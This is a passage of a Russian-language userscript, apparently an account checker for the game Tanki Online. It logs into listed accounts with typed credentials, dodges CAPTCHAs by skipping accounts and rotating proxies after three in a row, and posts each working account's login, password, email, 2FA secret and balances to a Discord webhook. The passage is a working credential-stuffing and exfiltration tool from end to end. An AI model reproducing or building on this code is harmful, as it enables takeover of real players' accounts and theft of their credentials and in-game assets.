            '.StartScreenComponentStyle-mainContainer',
            '.StartScreenComponentStyle-loadingBlock',
            '.StartScreenComponentStyle-text',
            '.StartScreenComponentStyle-logoTankOnline',
            '.StartScreenComponentStyle-mainContainer *'
        ];
        for (const selector of selectors) {
            const nodes = document.querySelectorAll(selector);
            for (const node of nodes) {
                if (!node || !node.isConnected) continue;
                const rect = node.getBoundingClientRect();
                if (rect.width < 2 || rect.height < 2) continue;
                forcePointerClick(node);
            }
        }

        const all = document.querySelectorAll('div, span, p, h1, h2, h3');
        for (const el of all) {
            const t = (el.textContent || '').trim();
            if (t.includes('Нажмите любую') || t.includes('Press any') || t.includes('нажмите любую')) {
                forcePointerClick(el);
                const parent = el.closest('.StartScreenComponentStyle-mainContainer') || el.parentElement;
                if (parent) forcePointerClick(parent);
            }
        }

        try {
            const cx = Math.floor(window.innerWidth / 2);
            const cy = Math.floor(window.innerHeight / 2);
            const under = document.elementFromPoint(cx, cy);
            if (under) forcePointerClick(under);
        } catch (_) {}

        return !isStartScreenVisible();
    }

    async function waitAndClickStartScreen() {
        const started = Date.now();
        while (Date.now() - started < 9000) {
            if (document.querySelector('.UserInfoContainerStyle-userNameRank')) return true;
            if (isStartScreenVisible()) break;
            if (document.querySelector('#username') || document.querySelector('.EntranceComponentStyle-buttonActive')) return true;
            await sleep(200);
        }
        if (!isStartScreenVisible()) return true;

        console.log('[Daily Rubies] Клик по стартовому экрану…');
        for (let i = 0; i < 20; i++) {
            if (clickStartScreenOnce()) {
                console.log('[Daily Rubies] Стартовый экран закрыт');
                await sleep(randomDelay(600, 1200));
                return true;
            }
            await sleep(randomDelay(250, 450));
        }
        try { await clickByText('Нажмите любую', 3000); } catch (_) {}
        await sleep(randomDelay(800, 1500));
        return !isStartScreenVisible();
    }

    // =========================================================
    // CAPTCHA COUNTER
    // =========================================================
    const CAPTCHA_COUNT_KEY = "tanki_captcha_count_v71";
    const CAPTCHA_LIMIT = 3;
    let _captchaCountedThisPage = false;

    const getCaptchaCount = () => parseInt(GM_getValue(CAPTCHA_COUNT_KEY, 0)) || 0;
    const setCaptchaCount = (n) => GM_setValue(CAPTCHA_COUNT_KEY, Math.max(0, n | 0));

    function resetCaptchaCount(reason) {
        const prev = getCaptchaCount();
        if (prev > 0) console.log(`[captcha] Счётчик сброшен (${prev} → 0)${reason ? ": " + reason : ""}`);
        setCaptchaCount(0);
        _captchaCountedThisPage = false;
    }
    function incrementCaptchaCount() { const c = getCaptchaCount() + 1; setCaptchaCount(c); return c; }
    const isCaptchaLimitReached = (c) => c >= CAPTCHA_LIMIT;

    function isCaptchaVisible() {
        const cap = document.querySelector("#captchaContainer");
        if (!cap) return false;
        if (cap.classList.contains("ReCaptchaComponentStyle-captchaDisableBlock")) return false;
        if (!cap.classList.contains("ReCaptchaComponentStyle-captchaBlock")) return false;
        const iframe = cap.querySelector('iframe[src*="recaptcha"], iframe[title*="reCAPTCHA"], iframe[src*="google.com/recaptcha"]');
        if (!iframe) return false;
        if (!document.querySelector("#username")) return false;
        if (isCaptchaSolved()) return false;
        const twofa = document.querySelector(".EntranceComponentStyle-title");
        if (twofa && (twofa.textContent || "").includes("Код безопасности")) return false;
        return true;
    }
    function isCaptchaSolved() {
        const response = document.querySelector("#g-recaptcha-response, textarea.g-recaptcha-response");
        if (response && response.value && String(response.value).trim().length > 10) return true;
        return !!document.querySelector("#recaptcha-anchor.recaptcha-checkbox-checked, .recaptcha-checkbox-checked");
    }
    function hasLoginErrorVisible() {
        const msg = document.querySelector(".EntranceComponentStyle-informationWriting span, .EntranceComponentStyle-commonBlockMessageError, .textError");
        if (msg && (msg.textContent || "").includes("Неправильный логин или пароль")) return true;
        return !!document.querySelector(".EntranceComponentStyle-invalidForm");
    }

    async function handleCaptchaIfVisible(login, timestamp) {
    if (!isCaptchaVisible()) return null;

    if (_captchaCountedThisPage) {
        console.log(
            `[${timestamp}] 🤖 Капча уже учтена (${getCaptchaCount()}/${CAPTCHA_LIMIT})`
        );
        return { login, status: "captcha" };
    }

    _captchaCountedThisPage = true;

    const cnt = incrementCaptchaCount();

    console.log(
        `[${timestamp}] 🤖 Капча (${cnt}/${CAPTCHA_LIMIT}) для ${login}`
    );

    // =====================================================
    // 3/3 — меняем proxy и продолжаем работу
    // =====================================================
    if (isCaptchaLimitReached(cnt)) {
        console.warn(`[${timestamp}] 🤖 CAPTCHA 3/3 — переключаем proxy и продолжаем работу`);

        if (MODE === "fastValid") advanceFastValidQueue();
        else advanceCheckQueue();

        let switched = false;
        if (CONFIG.PROXY_ENABLED && proxyRotationManager) {
            switched = await proxyRotationManager.switchNextProxy("CAPTCHA_3_CONSECUTIVE");
        } else if (!CONFIG.PROXY_ENABLED) {
            switched = true;
            console.warn(`[${timestamp}] CAPTCHA 3/3 — PROXY_ENABLED=false, переключение прокси пропущено`);
        }

        resetCaptchaCount("3 CAPTCHA подряд — proxy переключён");

        if (!switched) {
            console.error("[PROXY] Не удалось переключить proxy после 3 CAPTCHA подряд");
            showToast("3 CAPTCHA подряд — proxy не удалось сменить", "error");
            return { login, status: "captcha_proxy_switch_failed" };
        }

        if (CONFIG.PROXY_ENABLED) {
            showToast("3 CAPTCHA подряд — переключён proxy, продолжаем", "warning");
            sendDiscordMessage("🔄 CAPTCHA появилась 3 раза подряд — proxy автоматически переключён, проверка продолжается.");
        } else {
            showToast("3 CAPTCHA подряд — прокси выключены, продолжаем", "warning");
        }

        const nextAcc = shuffledAccounts[currentIndex];
        console.log(`[captcha] 3/3: ${login} пропущен → следующий аккаунт: ${nextAcc?.login || "нет"}`);

        await sleep(150);
        location.reload();

        return {
            login,
            status: "captcha_proxy_switched"
        };
    }

    // =====================================================
    // 1/3 или 2/3 — ПРОПУСКАЕМ ТЕКУЩИЙ АККАУНТ
    // =====================================================
    if (MODE === "fastValid") advanceFastValidQueue();
    else advanceCheckQueue();

    const nextAcc = shuffledAccounts[currentIndex];

    console.log(
        `[captcha] ${login}: пропуск аккаунта. ` +
        `Сохранён cursor=${currentIndex}. ` +
        `Следующий аккаунт=${nextAcc?.login || "нет"}`
    );

    showToast(
        `Капча ${cnt}/${CAPTCHA_LIMIT} — аккаунт пропущен, следующий`,
        "warning"
    );

    await sleep(150);

    location.reload();

    return {
        login,
        status: "captcha"
    };
}

    // =========================================================
    // LOBBY / SECTION HELPERS
    // =========================================================
    function getCurrentSectionName() {
        const el = document.querySelector(".BreadcrumbsComponentStyle-rootTitle span");
        return el ? (el.textContent || "").trim() || null : null;
    }
    function robustClick(el) {
        if (!el) return;
        try {
            el.dispatchEvent(new MouseEvent("mousedown", { bubbles: true, cancelable: true, view: window }));
            el.dispatchEvent(new MouseEvent("mouseup",   { bubbles: true, cancelable: true, view: window }));
            el.dispatchEvent(new MouseEvent("click",     { bubbles: true, cancelable: true, view: window }));
        } catch (e) { try { el.click(); } catch (e2) {} }
    }
    function findExitToLobbyButton() {
        const candidates = [
            document.querySelector(".BreadcrumbsComponentStyle-exitGameButton"),
            document.querySelector("[class*='exitGameButton']"),
            document.querySelector(".BreadcrumbsComponentStyle-exitGameButton .IconStyle-iconLogOff"),
            document.querySelector(".IconStyle-iconLogOff")
        ].filter(Boolean);
        for (const el of candidates) {
            if (!el || !el.isConnected) continue;
            const clickable = el.closest(".BreadcrumbsComponentStyle-exitGameButton") ||
                el.closest("[class*='exitGameButton']") ||
                el.closest("div") || el;
            const rect = clickable.getBoundingClientRect?.() || { width: 1, height: 1 };
            if (rect.width >= 1 && rect.height >= 1) return clickable;
        }
        return null;
    }

    async function clickExitButton() {
        const btn = findExitToLobbyButton();
        if (!btn) return false;
        robustClick(btn);
        try { btn.click(); } catch (_) {}
        return true;
    }

    /** Ждёт кнопку выхода и сразу жмёт. timeoutMs — сколько ждать появления. */
    async function waitAndClickExitToLobby(timeoutMs = 15000) {
        const start = Date.now();
        while (Date.now() - start < timeoutMs) {
            if (!getCurrentSectionName()) return true;
            const btn = findExitToLobbyButton();
            if (btn) {
                console.log("[lobby] Кнопка выхода найдена — клик");
                robustClick(btn);
                try { btn.click(); } catch (_) {}
                await sleep(randomDelay(700, 1100));
                if (!getCurrentSectionName()) return true;
                const btn2 = findExitToLobbyButton();
                if (btn2) {
                    robustClick(btn2);
                    try { btn2.click(); } catch (_) {}
                    await sleep(randomDelay(800, 1200));
                }
                if (!getCurrentSectionName()) return true;
            }
            await sleep(250);
        }
        return !getCurrentSectionName();
    }
    async function closeAnyModal() {
        for (let i = 0; i < 3; i++) {
            document.dispatchEvent(new KeyboardEvent("keydown", { key: "Escape", code: "Escape", keyCode: 27, which: 27, bubbles: true }));
            await sleep(120);
        }
        const selectors = [
            ".ConverterDialogComponentStyle-closeButton",
            "[class*='DialogComponentStyle-closeButton']",
            "[class*='Dialog'][class*='CloseButton']",
            "[class*='ModalComponentStyle-closeButton']",
            ".IconStyle-iconClose"
        ];
        for (const sel of selectors) {
            for (const el of document.querySelectorAll(sel)) {
                if (el.offsetParent !== null) { robustClick(el); await sleep(150); }
            }
        }
        await sleep(300);
    }
    async function ensureInLobby(maxAttempts = 6) {
        for (let i = 0; i < maxAttempts; i++) {
            const section = getCurrentSectionName();
            if (!section) return true;
            console.log(`↩ В разделе "${section}" — выход (попытка ${i + 1}/${maxAttempts})`);
            await closeAnyModal();
            const ok = await waitAndClickExitToLobby(8000);
            if (ok) return true;
            await sleep(randomDelay(600, 1000));
        }
        return !getCurrentSectionName();
    }
    async function exitToLobby() {
        await closeAnyModal();
        return await ensureInLobby(6);
    }

    // =========================================================
    // DOM HELPERS
    // =========================================================

    function getCurrentUserInfo() {
        try {
            const container = document.querySelector(".UserInfoContainerStyle-containerProgressMainScreen");
            if (!container) return null;

            const nameEl = container.querySelector(".UserInfoContainerStyle-userNameRank");
            const nickname = String(nameEl?.textContent || "")
                .replace(/^\[.*?\]\s*/, "")
                .trim();

            if (!nickname || nickname === "Player") return null;

            return {
                nickname,
                container
            };
        } catch (e) {
            return null;
        }
    }

    function getCurrentNickname() {
        return getCurrentUserInfo()?.nickname || null;
    }
    function getRubies() {
        for (const block of document.querySelectorAll(
            ".HeaderCommonStyle-icons, [class*='HeaderCommonStyle-icons']"
        )) {
            const img = block.querySelector('img[src*="ruby"]:not([src*="add" i]):not([src*="addRuby" i])');
            if (!img) continue;
            for (const s of block.querySelectorAll("span")) {
                const t = (s.textContent || "").trim();
                if (/^\d[\d\s\u00A0]*$/.test(t)) return parseNumberFromText(t);
            }
        }
        for (const img of document.querySelectorAll('img[src*="ruby."]:not([src*="add" i])')) {
            const p = img.parentElement;
            const s = p?.querySelector("span");
            if (s && /^\d/.test((s.textContent || "").trim())) return parseNumberFromText(s.textContent);
        }
        return "0";
    }
    function getCrystals() {
        for (const block of document.querySelectorAll(
            ".HeaderCommonStyle-icons, [class*='HeaderCommonStyle-icons']"
        )) {
            const img = block.querySelector('img[src*="crystal"]:not([src*="add" i])');
            if (!img) continue;
            for (const s of block.querySelectorAll("span")) {
                const t = (s.textContent || "").trim();
                if (/^\d[\d\s\u00A0]*$/.test(t)) return parseNumberFromText(t);
            }
        }
        return "0";
    }
    function getExperience() {
        try {
            const el = document.querySelector(".UserInfoContainerStyle-progressValue");
            if (!el) return 0;
            const text = (el.childNodes[0]?.textContent || el.textContent || "").trim();
            const beforeSlash = text.split("/")[0] || text;
            return parseInt(parseNumberFromText(beforeSlash), 10) || 0;
        } catch (e) { return 0; }
    }

    function findElementByText(text, selectors = null) {
        const list = selectors
            ? [...document.querySelectorAll(selectors.join(","))]
            : [...document.querySelectorAll("span, div, h1, h2, h3, button, li, a")];
        const target = String(text).trim().toLowerCase();
        for (const el of list) {
            if (!el.offsetParent) continue;
            const t = (el.textContent || "").trim().toLowerCase();
            if (t === target) return el;
        }
        for (const el of list) {
            if (!el.offsetParent) continue;
            const t = (el.textContent || "").trim().toLowerCase();
            if (t.includes(target)) return el;
        }
        return null;
    }

    function findCardByTitle(title) {
        const target = String(title).trim().toLowerCase();
        const cards = document.querySelectorAll(".ScrollingCardsComponentStyle-scrollCard");
        for (const card of cards) {
            const name = card.querySelector(".ScrollingCardsComponentStyle-cardName");
            if (name && (name.textContent || "").trim().toLowerCase().includes(target)) return card;
        }
        const anyCards = document.querySelectorAll("[class*='ScrollingCardsComponentStyle-scrollCard'], .cardImg");
        for (const card of anyCards) {
            const name = card.querySelector(".ScrollingCardsComponentStyle-cardName, .cardName");
            if (name && (name.textContent || "").trim().toLowerCase().includes(target)) return card;
        }
        return null;
    }

    function findMissionByName(name) {
        const target = String(name).trim().toLowerCase();
        const matchesName = (el) => {
            if (!el) return false;
            const t = (el.textContent || "").trim().toLowerCase();
            return t === target || t.includes(target);
        };
        const containers = document.querySelectorAll(
            ".MainQuestComponentStyle-cardRewardCompleted," +
            ".TableMainQuestComponentStyle-cardRewardCompletedTable," +
            "[class*='MainQuestComponentStyle-cardRewardCompleted']," +
            "[class*='TableMainQuestComponentStyle-cardRewardCompletedTable']"
        );
        for (const c of containers) {
            const n = c.querySelector(".MainQuestComponentStyle-nameMission, .MainQuestComponentStyle-name");
            if (matchesName(n)) return c;
        }
        for (const c of containers) {
            for (const el of c.querySelectorAll("span, h3, h4")) {
                if (matchesName(el)) return c;
            }
        }
        for (const el of document.querySelectorAll("span, h3, h4")) {
            if (!matchesName(el)) continue;
            const c = el.closest(
                ".MainQuestComponentStyle-cardRewardCompleted," +
                ".TableMainQuestComponentStyle-cardRewardCompletedTable," +
                "[class*='MainQuestComponentStyle-cardRewardCompleted']," +
                "[class*='TableMainQuestComponentStyle-cardRewardCompletedTable']"
            );
            if (c) return c;
            const p = el.closest("[class*='MainQuestComponentStyle'], [class*='TableMainQuestComponentStyle']");
            if (p) return p;
        }
        return null;
    }

    function extractProgress(node) {
        if (!node) return null;
        for (const el of node.querySelectorAll("h4, h3, span, div")) {
            const t = (el.textContent || "").trim();
            const m = t.match(/^(\d{1,3})\s*\/\s*(\d{1,3})$/);
            if (m) return { completed: +m[1], total: +m[2] };
        }
        const m = (node.textContent || "").match(/(?<!\d)(\d{1,3})\s*\/\s*(\d{1,3})(?!\d)/);
        if (m) return { completed: +m[1], total: +m[2] };
        return null;
    }

    function clickElementRobust(el) {
        if (!el) return false;
        try {
            const inner = el.querySelector("span, div, button") || el;
            inner.dispatchEvent(new MouseEvent("mousedown", { bubbles: true, cancelable: true, view: window }));
            inner.dispatchEvent(new MouseEvent("mouseup",   { bubbles: true, cancelable: true, view: window }));
            inner.dispatchEvent(new MouseEvent("click",     { bubbles: true, cancelable: true, view: window }));
            return true;
        } catch (e) {
            try { el.click(); return true; } catch (e2) { return false; }
        }
    }

    function waitForElement(selector, timeout = 1600, attempts = 4) {
        return new Promise(async (resolve, reject) => {
            for (let i = 0; i < attempts; i++) {
                try { const el = document.querySelector(selector); if (el) return resolve(el); } catch (e) {}
                await sleep(timeout / attempts);
            }
            reject(new Error(`Element not found: ${selector}`));
        });
    }
    async function tryFindElement(selector, timeout = 900, attempts = 3) {
        try { return await waitForElement(selector, timeout, attempts); } catch (e) { return null; }
    }
    async function waitForText(text, timeout = 10000) {
        const start = Date.now();
        while (Date.now() - start < timeout) {
            const el = findElementByText(text);
            if (el) return el;
            await sleep(150);
        }
        return null;
    }
    async function waitForLobby(timeout = 20000) {
        const start = Date.now();
        while (Date.now() - start < timeout) {
            if (document.querySelector(".UserInfoContainerStyle-userNameRank")) return true;
            await sleep(200);
        }
        return false;
    }
    async function waitForBalanceUpdate(oldValue, timeout = 6000) {
        const start = Date.now();
        while (Date.now() - start < timeout) {
            const v = getRubies();
            if (v !== oldValue) return v;
            await sleep(250);
        }
        return getRubies();
    }

    async function clickByText(text, timeout = 7500) {
        const start = Date.now();
        while (Date.now() - start < timeout) {
            const els = document.querySelectorAll(".RoundBigButtonComponentStyle-buttonText, .EntranceComponentStyle-buttonActive span, .StartScreenComponentStyle-text, span");
            for (const el of els) {
                if ((el.textContent || "").trim().includes(text)) {
                    const parent = el.closest(".RoundBigButtonComponentStyle-commonContainer, .EntranceComponentStyle-buttonActive, .StartScreenComponentStyle-mainContainer");
                    if (parent) { parent.click(); await sleep(randomDelay(140, 280)); return parent; }
                    el.click(); await sleep(randomDelay(140, 280)); return el;
                }
            }
            await sleep(45);
        }
        throw new Error(`Element with text "${text}" not found`);
    }
    function clearInputFields() {
        try {
            const l = document.querySelector("#username");
            const p = document.querySelector("#password");
            if (l) setValueNative(l, "");
            if (p) setValueNative(p, "");
        } catch (e) {}
    }
    function isLoginFormEmpty() {
        const l = document.querySelector("#username");
        const p = document.querySelector("#password");
        if (!l || !p) return false;
        return !(l.value || "").trim() && !(p.value || "").trim();
    }
    async function reloadIfLoginFormEmptyTooLong(emptyMs = 5000) {
        if (!document.querySelector("#username")) return false;
        const started = Date.now();
        while (Date.now() - started < emptyMs) {
            if (!isLoginFormEmpty()) return false;
            if (isCaptchaVisible()) return false;
            const twofa = document.querySelector(".EntranceComponentStyle-title");
            if (twofa && (twofa.textContent || "").includes("Код безопасности")) return false;
            await sleep(250);
        }
        console.log("[reload] Форма логина пустая >5с — reload");
        location.reload();
        return true;
    }
    function getPreferredLogin(acc) {
        if (!acc) return null;
        const email = normalizeEmail(acc.email);
        return email || String(acc.login || "").trim();
    }

    async function enterCredentialsAndPlay(login, password) {
        window.__tankiTypingCredentials = true;
        try {
            clearInputFields();
            await sleep(randomDelay(60, 110));
            const loginInput = await waitForElement("#username", 2800, 4);
            await humanType(loginInput, login);
            const passInput = await waitForElement("#password", 2000, 3);
            await humanType(passInput, password);
            try {
                const cb = document.querySelector('.CheckBoxStyle-checkbox input[type="checkbox"]');
                if (cb && cb.checked) cb.click();
            } catch (e) {}
            await clickByText("Играть", 5500);
            await sleep(randomDelay(1000, 1450));
        } finally {
            setTimeout(() => { window.__tankiTypingCredentials = false; }, 2000);
        }
    }
    function checkConnectionError() {
        const title = document.querySelector(".HeaderComponentStyle-messageTitle");
        const body = document.querySelector(".HeaderComponentStyle-messageBody");
        if (title && title.textContent.includes("Сбой")) return true;
        if (body && (body.textContent.includes("Потеряно соединение") || body.textContent.includes("ControlChannelDisconnectException"))) return true;
        return false;
    }

    // =========================================================
    // DISCORD NOTIFICATIONS — STABLE VERSION
    // =========================================================

const DISCORD_MAX_ATTEMPTS = 4;
const DISCORD_RETRY_DELAY = 1500;
const DISCORD_QUEUE_DELAY = 250;

let discordQueue = [];
let discordQueueRunning = false;
let discordLastSend = 0;


function normalizeDiscordWebhook(url) {
    if (!url || typeof url !== "string") return null;
    let u = url.trim();
    u = u.replace(/^["'\s]+|["'\s]+$/g, "");
    u = u.replace(/\/+$/, "");
    return u || null;
}


function isOfficialDiscordWebhook(url) {
    const u = normalizeDiscordWebhook(url);
    if (!u) return false;
    return /^https:\/\/(?:(?:canary|ptb)\.)?discord(?:app)?\.com\/api\/webhooks\/\d+\/[\w-]+$/i.test(u);
}


function isValidDiscordWebhook(url) {
    const u = normalizeDiscordWebhook(url);
    if (!u) return false;
    if (isOfficialDiscordWebhook(u)) return true;
    try {
        const parsed = new URL(u);
        if (parsed.protocol !== "https:") return false;
        if (!parsed.hostname || parsed.hostname.length < 3) return false;
        if (parsed.hostname === "localhost" || parsed.hostname === "127.0.0.1") return false;
        return true;
    } catch (_) {
        return false;
    }
}


function isDiscordConfigured() {
    return isValidDiscordWebhook(CONFIG?.DISCORD_WEBHOOK);
}


function discordRequest(payload) {
    return new Promise((resolve) => {
        if (!isDiscordConfigured()) {
            resolve({
                ok: false,
                reason: "webhook_not_configured"
            });
            return;
        }

        let finished = false;

        const finish = (result) => {
            if (finished) return;
            finished = true;
            resolve(result);
        };

        try {
            GM_xmlhttpRequest({
                method: "POST",

                url: CONFIG.DISCORD_WEBHOOK.trim(),

                headers: {
                    "Content-Type": "application/json"
                },

                data: JSON.stringify(payload),

                timeout: 15000,

                onload: (response) => {
                    const status = Number(response.status || 0);

                    if (status >= 200 && status < 300) {
                        finish({
                            ok: true,
                            status
                        });
                        return;
                    }

                    let reason = `HTTP ${status}`;

                    if (status === 400) {
                        reason = "HTTP 400 — Discord отклонил сообщение";
                    } else if (status === 401) {
                        reason = "HTTP 401 — webhook недействителен";
                    } else if (status === 403) {
                        reason = "HTTP 403 — webhook запрещён";
                    } else if (status === 404) {
                        reason = "HTTP 404 — webhook не найден";
                    } else if (status === 429) {
                        reason = "HTTP 429 — rate limit";
                    }

                    finish({
                        ok: false,
                        status,
                        reason
                    });
                },

                onerror: () => {
                    finish({
                        ok: false,
                        reason: "network_error"
                    });
                },

                ontimeout: () => {
                    finish({
                        ok: false,
                        reason: "timeout"
                    });
                },

                onabort: () => {
                    finish({
                        ok: false,
                        reason: "aborted"
                    });
                }
            });

        } catch (error) {
            finish({
                ok: false,
                reason: "exception",
                error
            });
        }
    });
}


async function sendDiscordMessage(content = null, embed = null) {

    if (!isDiscordConfigured()) {
        console.warn("[Discord] Webhook не настроен");
        return false;
    }

    const payload = {
        username: "Tanki Checker",
        avatar_url:
            "https://tankionline.com/play/static/images/tanki_online_white.b4613c5f.svg"
    };

    if (content) {
        payload.content = String(content);
    }

    if (embed) {
        payload.embeds = [embed];
    }

    for (let attempt = 1; attempt <= DISCORD_MAX_ATTEMPTS; attempt++) {

        const result = await discordRequest(payload);

        if (result.ok) {
            console.log(
                `[Discord] Сообщение отправлено. Попытка ${attempt}/${DISCORD_MAX_ATTEMPTS}`
            );

            return true;
        }

        console.warn(
            `[Discord] Ошибка отправки (${attempt}/${DISCORD_MAX_ATTEMPTS}):`,
            result.reason
        );


        if (
            result.status === 400 ||
            result.status === 401 ||
            result.status === 403 ||
            result.status === 404
        ) {
            break;
        }

        if (attempt < DISCORD_MAX_ATTEMPTS) {
            await sleep(DISCORD_RETRY_DELAY * attempt);
        }
    }

    console.error("[Discord] Не удалось отправить сообщение");

    return false;
}


function queueDiscordNotification(content = null, embed = null) {

    discordQueue.push({
        content,
        embed,
        createdAt: Date.now()
    });

    processDiscordQueue();

    return true;
}


async function processDiscordQueue() {

    if (discordQueueRunning) return;

    discordQueueRunning = true;

    try {

        while (discordQueue.length > 0) {

            const item = discordQueue.shift();

            if (!item) continue;

            const now = Date.now();
            const elapsed = now - discordLastSend;

            if (elapsed < DISCORD_QUEUE_DELAY) {
                await sleep(DISCORD_QUEUE_DELAY - elapsed);
            }

            await sendDiscordMessage(
                item.content,
                item.embed
            );

            discordLastSend = Date.now();
        }

    } catch (error) {

        console.error(
            "[Discord] Ошибка обработки очереди:",
            error
        );

    } finally {

        discordQueueRunning = false;


        if (discordQueue.length > 0) {
            setTimeout(
                processDiscordQueue,
                DISCORD_QUEUE_DELAY
            );
        }
    }
}


function sendDiscordEmbed(embed) {
    return queueDiscordNotification(null, embed);
}


function sendDiscordText(text) {
    return queueDiscordNotification(text, null);
}


/**
 * Валидный аккаунт — пароль и компенсация всегда.
 * Отправка через await sendDiscordMessage (не очередь).
 */
async function notifyValidAccount(data) {

    if (!data || !isDiscordConfigured()) {
        return false;
    }

    const secret = data.twofaSecret
        ? String(data.twofaSecret).replace(/\s+/g, "").toUpperCase()
        : null;
    const secretSpoiler = secret ? ("||" + secret + "||") : null;

    const fields = [
        { name: "Логин", value: "`" + String(data.login || "—") + "`", inline: true },
        { name: "Пароль", value: "`" + String(data.password || "—") + "`", inline: true },
        { name: "Почта", value: "`" + String(data.email || "—") + "`", inline: true },
        { name: "Рубины", value: String(data.rubies ?? "—"), inline: true },
        { name: "Танкоины", value: String(data.tankoins ?? "—"), inline: true },
        { name: "Кристаллы", value: String(data.crystals ?? "—"), inline: true },
        { name: "Золотые ящики", value: String(data.goldBoxes ?? "—"), inline: true },
        { name: "Ранг", value: String(data.rank ?? "—"), inline: true },
        { name: "Опыт", value: String(data.experience ?? "—"), inline: true },
        { name: "Год регистрации", value: String(data.year ?? "—"), inline: true },
        { name: "Привязан", value: data.bound ? "Да" : "Нет", inline: true },
        { name: "Смена ника", value: data.nickChange ? "Да" : "Нет", inline: true },
        { name: "Компенсация", value: data.bonusReceived ? "Есть" : "Нет", inline: true }
    ];

    if (data.ip) {
        fields.push({ name: "IP прокси", value: "`" + String(data.ip) + "`", inline: true });
    }
    if (data.loginWasEmail) {
        fields.push({ name: "Вход", value: "По почте", inline: true });
    }
    if (data.loginUsed && data.loginUsed !== data.login) {
        fields.push({ name: "Использованный логин", value: "`" + String(data.loginUsed) + "`", inline: true });
    }
    if (data.newNickname) {
        fields.push({ name: "Новый ник", value: "`" + String(data.newNickname) + "`", inline: true });
    }
    if (secretSpoiler) {
        fields.push({ name: "2FA Secret", value: secretSpoiler, inline: false });
    }

    const title = secret ? "✅ Валидный аккаунт · 2FA" : "✅ Валидный аккаунт";
    const color = secret ? 0x5865F2 : 0x57F287;

    const ok = await sendDiscordMessage(null, {
        title,
        color,
        fields,
        timestamp: new Date().toISOString()
    });
    if (!ok) {
        let line = "✅ `" + (data.login || "—") + "` / `" + (data.password || "—") + "` | " + (data.rank || "—") + " | ◆" + (data.rubies ?? 0);
        if (secretSpoiler) line += "\n🔐 2FA Secret: " + secretSpoiler;
        await sendDiscordMessage(line, null);
    }
    return ok;
}


async function notifyBonusReceived(data) {

    if (!data || !isDiscordConfigured()) {
        return false;
    }

    const fields = [
        {
            name: "Логин",
            value: `\`${String(data.login || "—")}\``,
            inline: true
        },

        {
            name: "Ник",
            value: `\`${String(data.username || "—")}\``,
            inline: true
        },

        {
            name: "Рубины",
            value: String(data.rubies ?? "—"),
            inline: true
        },

        {
            name: "Танкоины",
            value: String(data.tankoins ?? "—"),
            inline: true
        },

        {
            name: "Кристаллы",
            value: String(data.crystals ?? "—"),
            inline: true
        },

        {
            name: "Компенсация",
            value: "🎁 Есть",
            inline: true
        }
    ];

    if (data.ip) {
        fields.push({
            name: "IP прокси",
            value: `\`${String(data.ip)}\``,
            inline: true
        });
    }

    return sendDiscordEmbed({
        title: "🎁 Бонус получен",
        color: 0xFEE75C,
        fields,
        timestamp: new Date().toISOString()
    });
}


async function notifyNicknameChange(login, password, extra = {}) {

    if (!isDiscordConfigured()) {
        return false;
    }

    const fields = [
        {
            name: "Логин",
            value: `\`${String(login || "—")}\``,
            inline: true
        },

        {
            name: "Старый ник",
            value: `\`${String(extra.oldNickname || "—")}\``,
            inline: true
        },

        {
            name: "Новый ник",
            value: `\`${String(extra.newNickname || "—")}\``,
            inline: true
        }
    ];

    if (extra.ip) {
        fields.push({
            name: "IP прокси",
            value: `\`${String(extra.ip)}\``,
            inline: true
        });
    }

    return sendDiscordEmbed({
        title: "🔄 Смена ника",
        color: 0x5865F2,
        fields,
        timestamp: new Date().toISOString()
    });
}


async function notifyNicknameFixed(data) {

    if (!data || !isDiscordConfigured()) {
        return false;
    }

    const fields = [
        {
            name: "Логин",
            value: `\`${String(data.login || "—")}\``,
            inline: true
        },

        {
            name: "Новый ник",
            value: `\`${String(data.newNickname || "—")}\``,
            inline: true
        },

        {
            name: "Статус",
            value: data.ok ? "Исправлен" : "Ошибка",
            inline: true
        }
    ];

    if (data.ip) {
        fields.push({
            name: "IP прокси",
            value: `\`${String(data.ip)}\``,
            inline: true
        });
    }

    return sendDiscordEmbed({
        title: data.ok
            ? "🛠 Никнейм исправлен"
            : "⚠️ Ошибка смены ника",

        color: data.ok
            ? 0x57F287
            : 0xED4245,

        fields,

        timestamp: new Date().toISOString()
    });
}


async function notifyRubiesCollected(data) {

    if (
        !data ||
        !isDiscordConfigured() ||
        !CONFIG.DISCORD_RUBIES_NOTIFICATIONS
    ) {
        return false;
    }

    const fields = [
        {
            name: "Логин",
            value: `\`${String(data.login || "—")}\``,
            inline: true
        },

        {
            name: "Ник",
            value: `\`${String(data.username || "—")}\``,
            inline: true
        },

        {
            name: "Ранг",
            value: String(data.rank ?? "—"),
            inline: true
        },

        {
            name: "Рубины до",
            value: String(data.rubiesBefore ?? "—"),
            inline: true
        },

        {
            name: "Рубины после",
            value: String(data.rubiesAfter ?? "—"),
            inline: true
        },

        {
            name: "Собрано дней",
            value: String(data.completedDays ?? "—"),
            inline: true
        },

        {
            name: "Всего дней",
            value: String(data.totalDays ?? "—"),
            inline: true
        },

        {
            name: "Осталось дней",
            value: String(data.remainingDays ?? "—"),
            inline: true
        }
    ];

    return sendDiscordEmbed({
        title: "💎 Daily Rubies — награда собрана",
        color: 0x9B59B6,
        fields,
        timestamp: new Date().toISOString()
    });
}


async function testDiscordNotification() {
    const webhook = normalizeDiscordWebhook(CONFIG.DISCORD_WEBHOOK || "");

    if (!webhook) {
        console.warn("[Discord] Webhook URL не задан");
        return false;
    }

    if (!isValidDiscordWebhook(webhook)) {
        console.warn("[Discord] Некорректный webhook URL:", webhook.slice(0, 80));
        return false;
    }

    CONFIG.DISCORD_WEBHOOK = webhook;
    if (typeof isOfficialDiscordWebhook === "function" && !isOfficialDiscordWebhook(webhook)) {
        console.log("[Discord] Используется кастомный прокси webhook:", webhook);
    }

    let ip = null;
    try {
        if (CONFIG.IP_CHECK_ENABLED && typeof fetchCurrentIP === "function") {
            ip = await fetchCurrentIP();
        }
    } catch (error) {
        console.warn("[Discord] Не удалось получить IP:", error);
    }

    const fields = [
        {
            name: "Статус",
            value: "Discord notification system работает",
            inline: false
        }
    ];

    if (ip) {
        fields.push({
            name: "IP proxy",
            value: `\`${String(ip)}\``,
            inline: true
        });
    }

    return await sendDiscordMessage(null, {
        title: "✅ Tanki Checker — Discord Test",
        color: 0x57F287,
        fields,
        timestamp: new Date().toISOString()
    });
}
    // =========================================================
    // CHECKER FLOW
    // =========================================================
    function readGoldBoxesFromDom() {
        // Только стабильные признаки: cellAdd + img GoldBox*.svg; число в span того же контейнера.
        // Не используем динамические классы вида ksc-203.
